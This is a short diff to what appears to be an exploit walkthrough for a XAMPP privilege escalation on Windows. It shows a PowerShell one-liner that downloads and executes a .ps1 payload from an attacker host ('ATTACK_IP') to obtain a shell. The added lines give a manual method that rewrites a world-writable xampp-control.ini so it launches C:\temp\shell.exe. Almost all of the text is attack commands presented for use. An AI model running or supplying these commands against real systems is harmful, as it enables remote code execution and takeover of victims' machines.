@@ -38,3 +38,10 @@ Victim
 ### 7) Run the .ps1 payload and wait for your shell
 
     iex(new-object net.webclient).downloadstring('http://ATTACK_IP/50337.ps1')
+
+OR exploit it manually by replacing the xampp-control.ini configuration file (World-Writable xampp-control.ini)
+
+    $file = "C:\xampp\xampp-control.ini"
+    $find = ((Get-Content $file)[2] -Split "=")[1]
+    $replace = "C:\temp\shell.exe"
+    (Get-Content $file) -replace $find, $replace | Set-Content $file
